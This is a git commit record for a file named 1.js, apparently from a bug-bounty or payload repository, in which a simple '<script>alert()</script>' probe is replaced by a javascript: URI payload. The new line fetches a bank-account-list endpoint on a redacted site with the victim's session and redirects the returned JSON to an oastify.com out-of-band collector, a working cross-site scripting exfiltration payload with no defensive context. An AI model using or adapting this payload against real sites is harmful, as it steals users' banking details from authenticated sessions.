5bb6f115877c5f062debd6379db673b01a5aa184
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2024-02-28 14:37:22 +0530

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,1 @@
-<script>alert()</script>
+javascript:fetch('https://www.REDACTED.com/my/dashboard/db_bank_account_list', {referrerPolicy: 'no-referrer'}).then(r=>r.json()).then(d=>location.href=`https://REDACTED.oastify.com?data=${encodeURIComponent(JSON.stringify(d))}`);
